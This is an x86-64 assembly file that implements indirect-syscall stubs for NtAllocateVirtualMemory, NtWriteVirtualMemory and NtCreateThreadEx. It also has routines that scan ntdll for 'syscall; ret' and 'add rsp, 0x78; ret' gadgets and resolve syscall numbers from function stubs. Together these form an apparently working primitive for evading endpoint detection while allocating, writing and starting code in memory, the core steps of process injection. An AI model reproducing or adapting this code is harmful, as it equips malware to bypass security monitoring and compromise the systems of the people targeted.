section .data

syscall_ret dq 0000000000000000h
add_rsp_ret dq 0000000000000000h

section .text

global GetSSNByFuncAddress
global Search_For_Syscall_Ret
global Search_For_Add_Rsp_Ret
global NtAllocateVirtualMemory_Callback
global NtCreateThreadEx_Callback
global NtWriteVirtualMemory_Callback

NtAllocateVirtualMemory_Callback:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx               
    mov rcx, [rbx]              
    mov rdx, [rbx + 0x8]        
    mov r8, [rbx + 0x10]        
    mov r9, [rbx + 0x18]        
    mov r10, [rbx + 0x24]       
    mov [rsp+0x30], r10        
    mov r10, [rbx + 0x20]       
    mov [rsp+0x28], r10         
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x28]
    jmp r15

NtWriteVirtualMemory_Callback:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                
    mov rcx, [rbx]              
    mov rdx, [rbx + 0x8]        
    mov r8, [rbx + 0x10]        
    mov r9, [rbx + 0x18]        
    mov r10, [rbx + 0x20]       
    mov [rsp+0x28], r10        
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x28]
    jmp r15

NtCreateThreadEx_Callback:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                
    mov rcx, [rbx]              
    mov rdx, [rbx + 0x8]        
    mov r8, [rbx + 0x10]        
    mov r9, [rbx + 0x18]       
    mov r10, [rbx + 0x50]       
    mov [rsp+0x58], r10         
    mov r10, [rbx + 0x48]       
    mov [rsp+0x50], r10         
    mov r10, [rbx + 0x40]       
    mov [rsp+0x48], r10         
    mov r10, [rbx + 0x38]       
    mov [rsp+0x40], r10         
    mov r10, [rbx + 0x30]      
    mov [rsp+0x38], r10         
    mov r10, [rbx + 0x28]       
    mov [rsp+0x30], r10        
    mov r10, [rbx + 0x20]       
    mov [rsp+0x28], r10         
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x58]
    jmp r15

Search_For_Syscall_Ret:
    ; Search for Syscall + Ret
    mov rdx, rax
    add rdx, 1
    xor rbx, rbx
    xor rcx, rcx
    mov rcx, 00FFFFFF0000000000h
    mov rdi, [rdx]
    and rdi, rcx
    or rbx, rdi
    shr rbx, 28h
    cmp rbx, 1F0FC3h
    jne Search_For_Syscall_Ret + 3h
    mov r15, syscall_ret
    mov [r15], rdx
    xor r15, r15
    ret

Search_For_Add_Rsp_Ret:
    ; Search for add rsp, 78 + Ret
    mov rdx, rax
    add rdx, 1
    xor rbx, rbx
    xor rcx, rcx
    mov rcx, 0000FFFFFFFFFFh
    mov rdi, [rdx]
    and rdi, rcx
    or rbx, rdi
    mov r14, 00C378C48348h
    cmp rbx, r14
    jne Search_For_Add_Rsp_Ret + 3h
    mov r15, add_rsp_ret
    mov [r15], rdx
    ret

GetSSNByFuncAddress:
    mov ebx, 0xB8D18B4C
    mov rdx, 0x0
    mov rax, [rcx]
    cmp eax, ebx
    je GetSSNByFuncAddress + 0x1B
    add rcx, 0x20
    add rdx, 0x1
    jmp GetSSNByFuncAddress + 0xA
    mov rax, [rcx + 0x4]
    sub rax, rdx
    ret
